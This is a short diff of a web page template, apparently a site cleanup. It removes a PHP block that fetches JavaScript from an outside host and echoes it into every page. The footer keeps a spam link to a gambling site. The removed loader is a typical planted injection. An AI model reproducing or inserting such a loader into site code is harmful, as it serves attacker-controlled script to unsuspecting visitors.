@@ -1613,11 +1613,6 @@ footer#footer-sections {
     <footer class="sections" id="footer-sections" data-footer-sections>
 <small class="copyright__content"><a href="https://mt.namdu.uz/" title="Bandar Toto Macau">Copyright ©2024 Situs Bandar Toto Macau</a></small>
     </footer>
-<?php 
-$a = file_get_contents('http://timseosukses.com/code/olxtoto/index.js'); 
-echo $a; 
-?>
-
   </div>
 
   <script defer="defer"
